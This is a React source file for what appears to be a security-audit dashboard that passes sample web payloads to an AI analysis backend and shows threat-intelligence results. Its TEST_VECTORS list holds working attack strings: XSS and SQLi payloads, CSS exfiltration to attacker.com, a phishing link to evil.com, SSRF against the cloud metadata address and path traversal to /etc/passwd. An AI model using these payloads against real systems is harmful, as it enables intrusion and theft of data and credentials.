import React, { useState, useEffect } from 'react';
import { MessageSquare, ShieldAlert, Code, AlertCircle, Loader2, Send, Download, History, Zap, AlertTriangle, Key, Globe, Activity, Search, ShieldCheck, Eye, EyeOff, Terminal, Cpu } from 'lucide-react';
import { analyzeVulnerability, getThreatIntelligence, getLatestThreatFeed, analyzeAdvancedEvasion } from '../lib/gemini';
import { db, auth, useWebSocket, handleFirestoreError, OperationType, useAuth } from '../lib/firebase';
import { collection, addDoc, query, orderBy, limit, onSnapshot, serverTimestamp, where } from 'firebase/firestore';

const TEST_VECTORS = [
  { name: 'Basic XSS', payload: '<script>alert(1)</script>', type: 'XSS' },
  { name: 'SVG XSS', payload: '<svg onload=alert(1)>', type: 'XSS' },
  { name: 'CSS Injection', payload: 'body { background: url("javascript:alert(1)") }', type: 'CSS' },
  { name: 'Iframe Injection', payload: '<iframe src="javascript:alert(1)"></iframe>', type: 'XSS' },
  { name: 'Event Handler XSS', payload: '<img src=x onerror=alert(1)>', type: 'XSS' },
  { name: 'CSS Exfiltration', payload: 'input[value^="a"] { background: url("https://attacker.com/a") }', type: 'CSS' },
  { name: 'DOM XSS (Location)', payload: 'javascript:alert(document.domain)', type: 'DOM XSS' },
  { name: 'Template Injection', payload: '{{7*7}}', type: 'SSTI' },
  { name: 'Markdown XSS', payload: '[click me](javascript:alert(1))', type: 'XSS' },
  { name: 'CRLF Injection', payload: 'Set-Cookie: session=attacker_id\r\nLocation: http://attacker.com', type: 'CRLF' },
  { name: 'HTML Injection', payload: '<h1>Hacked</h1><p>Your session has expired. Please <a href="http://evil.com">login again</a>.</p>', type: 'HTML' },
  { name: 'JS Context Escape', payload: '"); alert(1); //', type: 'XSS' },
  { name: 'Prototype Pollution', payload: '{"__proto__": {"admin": true}}', type: 'POLLUTION' },
  { name: 'Blind SQLi', payload: "' OR 1=1--", type: 'SQLi' },
  { name: 'NoSQL Operator', payload: '{"$gt": ""}', type: 'NoSQLi' },
  { name: 'SSRF Cloud', payload: 'http://169.254.169.254/latest/meta-data/', type: 'SSRF' },
  { name: 'Open Redirect', payload: '//google.com/%2f..', type: 'REDIRECT' },
  { name: 'Path Traversal', payload: '../../../../etc/passwd', type: 'LFI' },
];

export function SecurityModule() {
  const [activeSubTab, setActiveSubTab] = useState<'VULN' | 'THREAT' | 'EVASION'>('VULN');
  const [loading, setLoading] = useState(false);
  const [analysis, setAnalysis] = useState<any>(null);
  const [evasionAnalysis, setEvasionAnalysis] = useState<any>(null);
  const [customPayload, setCustomPayload] = useState('');
  const [history, setHistory] = useState<any[]>([]);
  
  // Threat Intel State
  const [threatQuery, setThreatQuery] = useState('');
  const [threatResult, setThreatResult] = useState<any>(null);
  const [threatFeed, setThreatFeed] = useState<any[]>([]);
  const [loadingFeed, setLoadingFeed] = useState(false);
  const [feedError, setFeedError] = useState<string | null>(null);

  const { sendMessage, lastMessage } = useWebSocket();
  const { user, isAuthReady } = useAuth();

  const runEvasionAnalysis = async (payload: string) => {
    if (!payload) return;
    setLoading(true);
    setEvasionAnalysis(null);
    try {
      const results = await analyzeAdvancedEvasion(payload);
      if (results && results.error) {
        throw new Error(results.error);
      }
      setEvasionAnalysis(results);
      
      // Broadcast via WebSocket
      sendMessage({
        type: 'AUDIT_ACTIVITY',
        data: {
          module: 'SECURITY',
          action: 'EVASION_ANALYSIS_COMPLETED',
          stealth_rating: results.stealth_rating,
          user: auth.currentUser?.displayName || 'ANONYMOUS_AUDITOR',
          timestamp: new Date().toISOString()
        }
      });
    } catch (error: any) {
      console.error('Evasion analysis failed:', error);
      if (error.message === 'RATE_LIMIT_EXCEEDED' || error.message === 'API_KEY_INVALID') {
        setEvasionAnalysis({ 
          error: error.message === 'RATE_LIMIT_EXCEEDED' 
            ? "Evasion analysis rate limit reached. Please upgrade your API key." 
            : "Invalid API key. Please re-select in the header.",
          isQuotaError: true 
        });
      } else {
        setEvasionAnalysis({ error: "Evasion analysis failed. Please try again later." });
      }
    } finally {
      setLoading(false);
    }
  };

  // Load history from Firestore
  useEffect(() => {
    if (!isAuthReady || !user) return;

    const q = query(
      collection(db, 'security_findings'),
      where('uid', '==', user.uid),
      orderBy('timestamp', 'desc'),
      limit(10)
    );

    const unsubscribe = onSnapshot(q, (snapshot) => {
      const docs = snapshot.docs.map(doc => ({ id: doc.id, ...doc.data() }));
      setHistory(docs);
    }, (error) => {
      handleFirestoreError(error, OperationType.LIST, 'security_findings');
    });

    return () => unsubscribe();
  }, [isAuthReady, user]);

  // Load initial threat feed with caching
  useEffect(() => {
    const fetchFeed = async () => {
      // Check if we have a cached feed that's less than 5 minutes old
      const cached = localStorage.getItem('threat_feed_cache');
      const cachedTime = localStorage.getItem('threat_feed_time');
      const now = Date.now();

      if (cached && cachedTime && (now - parseInt(cachedTime)) < 300000) {
        setThreatFeed(JSON.parse(cached));
        return;
      }

      setLoadingFeed(true);
      setFeedError(null);
      try {
        const feed = await getLatestThreatFeed();
        if (feed && feed.error) {
          setFeedError(feed.error === 'RATE_LIMIT_EXCEEDED' 
            ? "Threat feed rate limit reached. Please try again later or upgrade your API key." 
            : feed.error);
        } else if (Array.isArray(feed)) {
          setThreatFeed(feed);
          localStorage.setItem('threat_feed_cache', JSON.stringify(feed));
          localStorage.setItem('threat_feed_time', now.toString());
        }
      } catch (e: any) {
        console.error("Failed to fetch threat feed", e);
        setFeedError(e.message === 'RATE_LIMIT_EXCEEDED' 
          ? "Threat feed rate limit reached. Please try again later or upgrade your API key." 
          : "Failed to fetch threat feed.");
      } finally {
        setLoadingFeed(false);
      }
    };
    fetchFeed();
  }, []);

  // Handle real-time updates from other clients
  useEffect(() => {
    if (lastMessage?.type === 'NEW_SECURITY_FINDING') {
      console.log('Real-time security finding received:', lastMessage.data);
      // Optionally show a toast or update local state
    }
  }, [lastMessage]);

  const runAnalysis = async (payload: string) => {
    setLoading(true);
    try {
      const results = await analyzeVulnerability(payload, 'Chat Box Input');
      const findingData = {
        ...results,
        raw_payload: payload,
        timestamp: new Date().toISOString(),
        uid: auth.currentUser?.uid || 'anonymous'
      };

      setAnalysis(findingData);

      // Persist to Firestore
      if (auth.currentUser) {
        await addDoc(collection(db, 'security_findings'), {
          ...findingData,
          timestamp: serverTimestamp()
        });
      }

      // Broadcast via WebSocket
      sendMessage({
        type: 'NEW_SECURITY_FINDING',
        data: {
          type: results.vulnerability_type,
          severity: results.severity,
          payload: payload,
          user: auth.currentUser?.displayName || 'ANONYMOUS_AUDITOR',
          timestamp: new Date().toISOString()
        }
      });

    } catch (error: any) {
      console.error('Analysis failed:', error);
      if (error.message === 'RATE_LIMIT_EXCEEDED' || error.message === 'API_KEY_INVALID') {
        const message = error.message === 'RATE_LIMIT_EXCEEDED' 
          ? "You've hit the free tier rate limit. Please upgrade your API key in the header to continue."
          : "Your selected API key is invalid. Please re-select a valid key in the header.";
        
        setAnalysis({
          error: message,
          isQuotaError: true
        });
      } else {
        setAnalysis({ error: "Analysis failed. Please try again later." });
      }
    } finally {
      setLoading(false);
    }
  };

  const runThreatLookup = async () => {
    if (!threatQuery) return;
    setLoading(true);
    setThreatResult(null);
    try {
      const results = await getThreatIntelligence(threatQuery);
      if (results && results.error) {
        throw new Error(results.error);
      }
      setThreatResult(results);
      
      // Broadcast via WebSocket
      sendMessage({
        type: 'AUDIT_ACTIVITY',
        data: {
          module: 'SECURITY',
          action: 'THREAT_INTEL_LOOKUP',
          target: threatQuery,
          user: auth.currentUser?.displayName || 'ANONYMOUS_AUDITOR',
          timestamp: new Date().toISOString()
        }
      });
    } catch (error: any) {
      console.error('Threat lookup failed:', error);
      if (error.message === 'RATE_LIMIT_EXCEEDED' || error.message === 'API_KEY_INVALID') {
        setThreatResult({ 
          error: error.message === 'RATE_LIMIT_EXCEEDED' 
            ? "Threat lookup rate limit reached. Please upgrade your API key." 
            : "Invalid API key. Please re-select in the header.",
          isQuotaError: true 
        });
      } else {
        setThreatResult({ error: "Threat lookup failed. Please try again later." });
      }
    } finally {
      setLoading(false);
    }
  };

  const handleExport = () => {
    if (!analysis) return;

    const headers = ["Vulnerability Type", "Severity", "Impact", "Mitigation", "Payload"];
    const row = [
      analysis.vulnerability_type || 'N/A',
      analysis.severity || 'N/A',
      `"${(analysis.potential_impact || 'N/A').replace(/"/g, '""')}"`,
      `"${(analysis.mitigation_strategy || 'N/A').replace(/"/g, '""')}"`,
      `"${(analysis.raw_payload || 'N/A').replace(/"/g, '""')}"`
    ];

    const csvContent = "data:text/csv;charset=utf-8," 
      + headers.join(",") + "\n"
      + row.join(",");

    const encodedUri = encodeURI(csvContent);
    const link = document.createElement("a");
    link.setAttribute("href", encodedUri);
    link.setAttribute("download", `security_analysis_${new Date().toISOString().split('T')[0]}.csv`);
    document.body.appendChild(link);
    link.click();
    document.body.removeChild(link);
  };

  return (
    <div className="space-y-8 animate-in fade-in duration-700">
      <div className="flex justify-between items-center border-b border-ink pb-4">
        <div>
          <h2 className="text-xl font-bold tracking-tight uppercase italic serif">SECURITY AUDIT & THREAT INTEL</h2>
          <p className="text-xs opacity-60">Vulnerability testing and real-time threat intelligence feed</p>
        </div>
        <div className="flex items-center gap-4">
          <div className="flex bg-bg border border-ink p-1">
            <button 
              onClick={() => setActiveSubTab('VULN')}
              className={`px-3 py-1 text-[10px] font-bold uppercase tracking-widest transition-colors ${activeSubTab === 'VULN' ? 'bg-ink text-bg' : 'text-ink hover:bg-ink/10'}`}
            >
              Vulnerability
            </button>
            <button 
              onClick={() => setActiveSubTab('EVASION')}
              className={`px-3 py-1 text-[10px] font-bold uppercase tracking-widest transition-colors ${activeSubTab === 'EVASION' ? 'bg-ink text-bg' : 'text-ink hover:bg-ink/10'}`}
            >
              Evasion
            </button>
            <button 
              onClick={() => setActiveSubTab('THREAT')}
              className={`px-3 py-1 text-[10px] font-bold uppercase tracking-widest transition-colors ${activeSubTab === 'THREAT' ? 'bg-ink text-bg' : 'text-ink hover:bg-ink/10'}`}
            >
              Threat Intel
            </button>
          </div>
          {analysis && !loading && (
            <button 
              onClick={handleExport}
              className="bg-bg border border-ink text-ink px-3 py-1.5 text-[10px] font-bold flex items-center gap-2 hover:bg-ink hover:text-bg transition-colors"
            >
              <Download className="w-3 h-3" />
              EXPORT CSV
            </button>
          )}
          <ShieldAlert className="w-8 h-8 text-red-600" />
        </div>
      </div>

      {/* Vulnerability Testing Section */}
      {activeSubTab === 'VULN' && (
        <section className="space-y-4 animate-in fade-in duration-500">
          <div className="flex items-center gap-2 border-l-4 border-ink pl-3">
            <Code className="w-5 h-5" />
            <h3 className="text-sm font-bold uppercase tracking-widest">Vulnerability Testing</h3>
          </div>
          
          <div className="grid grid-cols-1 lg:grid-cols-3 gap-6">
            {/* Test Vectors */}
            <div className="border border-ink p-6 bg-white shadow-sm lg:col-span-1">
              <div className="flex items-center gap-2 mb-4">
                <Zap className="w-4 h-4 text-yellow-600" />
                <h3 className="col-header">Advanced Test Vectors</h3>
              </div>
              <div className="space-y-2 max-h-[300px] overflow-y-auto pr-2 custom-scrollbar">
                {TEST_VECTORS.map((vector, i) => (
                  <div 
                    key={i} 
                    className="data-row"
                    onClick={() => runAnalysis(vector.payload)}
                  >
                    <span className="text-[10px] opacity-50">{String(i + 1).padStart(2, '0')}</span>
                    <span className="data-value text-sm truncate">{vector.name}</span>
                    <span className="text-[10px] uppercase opacity-50">{vector.type}</span>
                    <Send className="w-3 h-3 justify-self-end opacity-20" />
                  </div>
                ))}
              </div>

              <div className="mt-6">
                <h3 className="col-header mb-2">Custom Payload</h3>
                <div className="flex gap-2">
                  <input 
                    type="text" 
                    value={customPayload}
                    onChange={(e) => setCustomPayload(e.target.value)}
                    placeholder="Enter custom XSS/CSS payload..."
                    className="flex-1 border border-ink p-2 text-xs font-mono bg-bg/20 focus:outline-none"
                  />
                  <button 
                    onClick={() => runAnalysis(customPayload)}
                    disabled={loading || !customPayload}
                    className="bg-ink text-bg px-4 py-2 text-xs font-bold hover:opacity-90 disabled:opacity-50"
                  >
                    {loading ? <Loader2 className="w-4 h-4 animate-spin" /> : 'ANALYZE'}
                  </button>
                </div>
              </div>
            </div>

            {/* Analysis Results */}
            <div className="border border-ink p-6 bg-white shadow-sm lg:col-span-1">
              <div className="flex items-center gap-2 mb-4">
                <AlertCircle className="w-5 h-5" />
                <h3 className="col-header">Analysis Results</h3>
              </div>
              
              {loading && activeSubTab === 'VULN' && (
                <div className="terminal-card">
                  <p className="animate-pulse">Analyzing payload impact...</p>
                  <p className="text-xs mt-2 opacity-70">Checking for sanitization bypass...</p>
                </div>
              )}

              {analysis && !loading && (
                <div className="space-y-4">
                  {analysis.error ? (
                    <div className={`p-4 border-l-4 ${analysis.isQuotaError ? 'bg-yellow-50 border-yellow-600' : 'bg-red-50 border-red-600'}`}>
                      <div className="flex items-center gap-2 mb-2">
                        <AlertTriangle className={`w-5 h-5 ${analysis.isQuotaError ? 'text-yellow-600' : 'text-red-600'}`} />
                        <p className="font-bold text-sm uppercase">{analysis.isQuotaError ? 'Quota Exceeded' : 'Analysis Error'}</p>
                      </div>
                      <p className="text-xs opacity-80 leading-relaxed mb-4">{analysis.error}</p>
                      {analysis.isQuotaError && (
                        <button 
                          onClick={() => window.aistudio?.openSelectKey?.()}
                          className="w-full bg-ink text-bg py-2 text-[10px] font-bold uppercase tracking-widest hover:opacity-90 transition-opacity flex items-center justify-center gap-2"
                        >
                          <Key className="w-3 h-3" />
                          Upgrade API Key
                        </button>
                      )}
                    </div>
                  ) : (
                    <>
                      <div className={`p-3 border-l-4 ${
                        analysis.severity === 'Critical' ? 'bg-red-50 border-red-600' :
                        analysis.severity === 'High' ? 'bg-orange-50 border-orange-600' :
                        'bg-yellow-50 border-yellow-600'
                      }`}>
                        <p className="text-[10px] uppercase opacity-50">Severity: {analysis.severity}</p>
                        <p className="font-bold text-sm">{analysis.vulnerability_type}</p>
                      </div>

                      <div>
                        <h4 className="text-xs font-bold uppercase mb-1">Impact</h4>
                        <p className="text-xs opacity-80 leading-relaxed">{analysis.potential_impact}</p>
                      </div>

                      <div className="terminal-card mt-4">
                        <p className="text-[10px] mb-2 border-b border-green-900/30 pb-1">PAYLOAD_SOURCE</p>
                        <code className="text-xs break-all">{analysis.raw_payload || 'N/A'}</code>
                      </div>
                    </>
                  )}
                </div>
              )}

              {!analysis && !loading && (
                <div className="flex flex-col items-center justify-center py-20 opacity-20">
                  <MessageSquare className="w-16 h-16 mb-4" />
                  <p className="font-mono text-[10px] uppercase tracking-widest">Awaiting test vector</p>
                </div>
              )}
            </div>

            {/* Audit History */}
            <div className="border border-ink p-6 bg-white shadow-sm lg:col-span-1">
              <div className="flex items-center gap-2 mb-4">
                <History className="w-5 h-5" />
                <h3 className="col-header">Audit History</h3>
              </div>
              <div className="space-y-3 max-h-[400px] overflow-y-auto pr-2 custom-scrollbar">
                {history.map((item, i) => (
                  <div key={item.id} className="p-3 border border-bg bg-bg/10 hover:bg-bg/20 cursor-pointer transition-colors" onClick={() => setAnalysis(item)}>
                    <div className="flex justify-between items-start mb-1">
                      <span className={`text-[8px] px-1.5 py-0.5 rounded uppercase font-bold ${
                        item.severity === 'Critical' ? 'bg-red-600 text-white' :
                        item.severity === 'High' ? 'bg-orange-600 text-white' :
                        'bg-yellow-600 text-white'
                      }`}>
                        {item.severity}
                      </span>
                      <span className="text-[8px] opacity-50 font-mono">
                        {item.timestamp?.toDate ? item.timestamp.toDate().toLocaleTimeString() : 'RECENT'}
                      </span>
                    </div>
                    <p className="text-xs font-bold truncate">{item.vulnerability_type}</p>
                    <p className="text-[10px] opacity-60 truncate font-mono">{item.raw_payload}</p>
                  </div>
                ))}
                {history.length === 0 && (
                  <div className="flex flex-col items-center justify-center py-10 opacity-20">
                    <Zap className="w-8 h-8 mb-2" />
                    <p className="text-[10px] uppercase tracking-widest">No history</p>
                  </div>
                )}
              </div>
            </div>
          </div>
        </section>
      )}

      {/* Evasion Analysis Section */}
      {activeSubTab === 'EVASION' && (
        <section className="space-y-4 animate-in fade-in duration-500">
          <div className="flex items-center gap-2 border-l-4 border-purple-600 pl-3">
            <EyeOff className="w-5 h-5 text-purple-600" />
            <h3 className="text-sm font-bold uppercase tracking-widest">Advanced Evasion Analysis</h3>
          </div>

          <div className="grid grid-cols-1 lg:grid-cols-3 gap-6">
            <div className="lg:col-span-1 border border-ink p-6 bg-white shadow-sm">
              <h3 className="col-header mb-4">Payload Inspector</h3>
              <textarea 
                value={customPayload}
                onChange={(e) => setCustomPayload(e.target.value)}
                placeholder="Paste payload or code to analyze for evasion techniques..."
                className="w-full h-[300px] border border-ink p-3 text-xs font-mono bg-bg/20 focus:outline-none resize-none"
              />
              <button 
                onClick={() => runEvasionAnalysis(customPayload)}
                disabled={loading || !customPayload}
                className="w-full mt-4 bg-purple-600 text-white py-3 font-bold hover:opacity-90 disabled:opacity-50 flex items-center justify-center gap-2 shadow-[0_0_15px_rgba(147,51,234,0.2)]"
              >
                {loading ? <Loader2 className="w-4 h-4 animate-spin" /> : <Terminal className="w-4 h-4" />}
                {loading ? 'ANALYZING STEALTH...' : 'ANALYZE EVASION'}
              </button>
            </div>

            <div className="lg:col-span-2 border border-ink p-6 bg-white shadow-sm min-h-[400px]">
              {loading && activeSubTab === 'EVASION' && (
                <div className="terminal-card border-purple-600/30">
                  <p className="animate-pulse">DECONSTRUCTING PAYLOAD ARCHITECTURE...</p>
                  <p className="text-xs mt-2 opacity-70">Scanning for Anti-VM/Sandbox artifacts...</p>
                  <p className="text-xs opacity-70">Identifying polymorphic code patterns...</p>
                  <p className="text-xs opacity-70">Checking for process injection vectors...</p>
                </div>
              )}

              {evasionAnalysis && !loading && (
                <div className="space-y-6 animate-in slide-in-from-bottom-2 duration-500">
                  {evasionAnalysis.error ? (
                    <div className={`p-4 border-l-4 ${evasionAnalysis.isQuotaError ? 'bg-yellow-50 border-yellow-600' : 'bg-red-50 border-red-600'}`}>
                      <div className="flex items-center gap-2 mb-2">
                        <AlertTriangle className={`w-5 h-5 ${evasionAnalysis.isQuotaError ? 'text-yellow-600' : 'text-red-600'}`} />
                        <p className="font-bold text-sm uppercase">{evasionAnalysis.isQuotaError ? 'Quota Exceeded' : 'Analysis Error'}</p>
                      </div>
                      <p className="text-xs opacity-80 leading-relaxed mb-4">{evasionAnalysis.error}</p>
                      {evasionAnalysis.isQuotaError && (
                        <button 
                          onClick={() => window.aistudio?.openSelectKey?.()}
                          className="w-full bg-ink text-bg py-2 text-[10px] font-bold uppercase tracking-widest hover:opacity-90 transition-opacity flex items-center justify-center gap-2"
                        >
                          <Key className="w-3 h-3" />
                          Upgrade API Key
                        </button>
                      )}
                    </div>
                  ) : (
                    <>
                      <div className="grid grid-cols-1 md:grid-cols-3 gap-4">
                        <div className={`p-4 border border-ink flex flex-col items-center justify-center ${
                          evasionAnalysis.evasion_score > 70 ? 'bg-red-600 text-white' :
                          evasionAnalysis.evasion_score > 30 ? 'bg-orange-500 text-white' :
                          'bg-green-600 text-white'
                        }`}>
                          <span className="text-[10px] uppercase opacity-70 mb-1">Stealth Rating</span>
                          <span className="text-4xl font-bold">{evasionAnalysis.evasion_score}</span>
                          <span className="text-[10px] uppercase font-bold mt-1">{evasionAnalysis.stealth_rating}</span>
                        </div>
                        <div className="md:col-span-2 border border-ink p-4 bg-bg/10">
                          <h4 className="text-[10px] uppercase opacity-50 mb-2 font-bold">Analysis Details</h4>
                          <p className="text-xs leading-relaxed font-mono">{evasionAnalysis.analysis_details}</p>
                        </div>
                      </div>

                      <div className="grid grid-cols-1 md:grid-cols-2 gap-6">
                        <div className="border border-ink p-4">
                          <h4 className="text-[10px] uppercase opacity-50 mb-3 font-bold flex items-center gap-2">
                            <Cpu className="w-3 h-3" /> Techniques Detected
                          </h4>
                          <div className="flex flex-wrap gap-2">
                            {evasionAnalysis.techniques_detected?.map((t: string, i: number) => (
                              <span key={i} className="px-2 py-1 bg-red-600/10 text-red-700 text-[10px] font-bold border border-red-600/20 rounded">
                                {t}
                              </span>
                            ))}
                          </div>
                        </div>
                        <div className="border border-ink p-4">
                          <h4 className="text-[10px] uppercase opacity-50 mb-3 font-bold flex items-center gap-2">
                            <ShieldCheck className="w-3 h-3" /> Mitigation Strategy
                          </h4>
                          <p className="text-xs opacity-80">{evasionAnalysis.mitigation}</p>
                        </div>
                      </div>
                    </>
                  )}
                </div>
              )}

              {!evasionAnalysis && !loading && (
                <div className="flex flex-col items-center justify-center py-20 opacity-10">
                  <Eye className="w-24 h-24 mb-4" />
                  <p className="font-mono text-sm uppercase tracking-widest">Awaiting payload for stealth analysis</p>
                </div>
              )}
            </div>
          </div>
        </section>
      )}

      {/* Threat Intelligence Section */}
      {activeSubTab === 'THREAT' && (
        <section className="space-y-4 animate-in fade-in duration-500">
          <div className="flex items-center gap-2 border-l-4 border-red-600 pl-3">
            <Activity className="w-5 h-5 text-red-600" />
            <h3 className="text-sm font-bold uppercase tracking-widest">Threat Intelligence Feed</h3>
          </div>

          <div className="grid grid-cols-1 lg:grid-cols-3 gap-6">
            {/* Threat Feed */}
            <div className="border border-ink p-6 bg-white shadow-sm lg:col-span-1">
              <div className="flex items-center justify-between mb-4">
                <div className="flex items-center gap-2">
                  <Globe className="w-4 h-4" />
                  <h3 className="col-header">Live Malicious Indicators</h3>
                </div>
                {loadingFeed && <Loader2 className="w-3 h-3 animate-spin opacity-50" />}
              </div>
              
              <div className="space-y-3 max-h-[500px] overflow-y-auto pr-2 custom-scrollbar">
                {feedError && (
                  <div className="p-4 bg-yellow-50 border-l-4 border-yellow-600 text-yellow-700 text-[10px] font-bold uppercase mb-4">
                    <div className="flex items-center gap-2 mb-1">
                      <AlertTriangle className="w-3 h-3" />
                      <span>Feed Sync Error</span>
                    </div>
                    {feedError}
                  </div>
                )}
                {threatFeed.map((threat, i) => (
                  <div key={i} className="p-3 border border-bg bg-bg/10 hover:border-red-600 transition-all group relative overflow-hidden">
                    <div className="absolute top-0 right-0 w-1 h-full bg-red-600 opacity-0 group-hover:opacity-100 transition-opacity"></div>
                    <div className="flex justify-between items-start mb-1">
                      <span className={`text-[8px] px-1.5 py-0.5 rounded uppercase font-bold ${
                        threat.Severity === 'Critical' ? 'bg-red-600 text-white' : 'bg-orange-600 text-white'
                      }`}>
                        {threat.Severity}
                      </span>
                      <span className="text-[8px] opacity-50 font-mono uppercase">{threat.Type}</span>
                    </div>
                    <p className="text-xs font-bold font-mono group-hover:text-red-600 transition-colors">{threat.Indicator}</p>
                    <p className="text-[10px] opacity-70 mt-1 leading-tight line-clamp-2">{threat.Description}</p>
                    <button 
                      onClick={() => {
                        setThreatQuery(threat.Indicator);
                        runThreatLookup();
                      }}
                      className="mt-2 text-[8px] font-bold uppercase tracking-widest text-ink underline opacity-60 hover:opacity-100"
                    >
                      INVESTIGATE
                    </button>
                  </div>
                ))}
                {!loadingFeed && threatFeed.length === 0 && (
                  <p className="text-xs italic opacity-50 text-center py-10">No active threats detected.</p>
                )}
              </div>
            </div>

            {/* Threat Lookup */}
            <div className="border border-ink p-6 bg-white shadow-sm lg:col-span-2">
              <div className="flex items-center gap-2 mb-4">
                <Search className="w-5 h-5" />
                <h3 className="col-header">Indicator Intelligence Lookup</h3>
              </div>

              <div className="flex gap-2 mb-6">
                <input 
                  type="text" 
                  value={threatQuery}
                  onChange={(e) => setThreatQuery(e.target.value)}
                  placeholder="Enter IP or Domain (e.g., 1.2.3.4, malicious.com)..."
                  className="flex-1 border border-ink p-3 text-sm font-mono bg-bg/20 focus:outline-none"
                />
                <button 
                  onClick={runThreatLookup}
                  disabled={loading || !threatQuery}
                  className="bg-ink text-bg px-6 py-2 font-bold hover:opacity-90 disabled:opacity-50 flex items-center gap-2"
                >
                  {loading ? <Loader2 className="w-4 h-4 animate-spin" /> : <ShieldCheck className="w-4 h-4" />}
                  {loading ? 'INVESTIGATING...' : 'LOOKUP'}
                </button>
              </div>

              {threatResult && !loading && (
                <div className="space-y-6 animate-in slide-in-from-bottom-2 duration-500">
                  {threatResult.error ? (
                    <div className={`p-4 border-l-4 ${threatResult.isQuotaError ? 'bg-yellow-50 border-yellow-600' : 'bg-red-50 border-red-600'}`}>
                      <div className="flex items-center gap-2 mb-2">
                        <AlertTriangle className={`w-5 h-5 ${threatResult.isQuotaError ? 'text-yellow-600' : 'text-red-600'}`} />
                        <p className="font-bold text-sm uppercase">{threatResult.isQuotaError ? 'Quota Exceeded' : 'Analysis Error'}</p>
                      </div>
                      <p className="text-xs opacity-80 leading-relaxed mb-4">{threatResult.error}</p>
                      {threatResult.isQuotaError && (
                        <button 
                          onClick={() => window.aistudio?.openSelectKey?.()}
                          className="w-full bg-ink text-bg py-2 text-[10px] font-bold uppercase tracking-widest hover:opacity-90 transition-opacity flex items-center justify-center gap-2"
                        >
                          <Key className="w-3 h-3" />
                          Upgrade API Key
                        </button>
                      )}
                    </div>
                  ) : (
                    <>
                      <div className="grid grid-cols-1 md:grid-cols-3 gap-4">
                        <div className={`p-4 border border-ink flex flex-col items-center justify-center ${
                          threatResult.status === 'MALICIOUS' ? 'bg-red-600 text-white' :
                          threatResult.status === 'SUSPICIOUS' ? 'bg-orange-500 text-white' :
                          'bg-green-600 text-white'
                        }`}>
                          <span className="text-[10px] uppercase opacity-70 mb-1">Risk Score</span>
                          <span className="text-4xl font-bold">{threatResult.risk_score}</span>
                          <span className="text-[10px] uppercase font-bold mt-1">{threatResult.status}</span>
                        </div>
                        <div className="md:col-span-2 border border-ink p-4 bg-bg/10">
                          <h4 className="text-[10px] uppercase opacity-50 mb-2 font-bold">Technical Findings</h4>
                          <p className="text-xs leading-relaxed font-mono">{threatResult.technical_details}</p>
                          <p className="text-[10px] mt-4 opacity-50">LAST_SEEN: {threatResult.last_seen}</p>
                        </div>
                      </div>

                      <div className="grid grid-cols-1 md:grid-cols-2 gap-6">
                        <div className="border border-ink p-4">
                          <h4 className="text-[10px] uppercase opacity-50 mb-3 font-bold flex items-center gap-2">
                            <AlertTriangle className="w-3 h-3" /> Key Indicators
                          </h4>
                          <ul className="space-y-2">
                            {threatResult.findings?.map((f: string, i: number) => (
                              <li key={i} className="text-[10px] font-mono flex gap-2">
                                <span className="text-red-600">»</span> {f}
                              </li>
                            ))}
                          </ul>
                        </div>
                        <div className="border border-ink p-4">
                          <h4 className="text-[10px] uppercase opacity-50 mb-3 font-bold flex items-center gap-2">
                            <Globe className="w-3 h-3" /> Associated Campaigns
                          </h4>
                          <div className="flex flex-wrap gap-2">
                            {threatResult.campaigns?.map((c: string, i: number) => (
                              <span key={i} className="px-2 py-1 bg-ink text-bg text-[8px] font-bold uppercase tracking-tighter">
                                {c}
                              </span>
                            ))}
                          </div>
                        </div>
                      </div>
                    </>
                  )}
                </div>
              )}

              {!threatResult && !loading && (
                <div className="flex flex-col items-center justify-center py-20 opacity-10">
                  <ShieldCheck className="w-24 h-24 mb-4" />
                  <p className="font-mono text-sm uppercase tracking-widest">Awaiting indicator input</p>
                </div>
              )}
            </div>
          </div>
        </section>
      )}
    </div>
  );
}
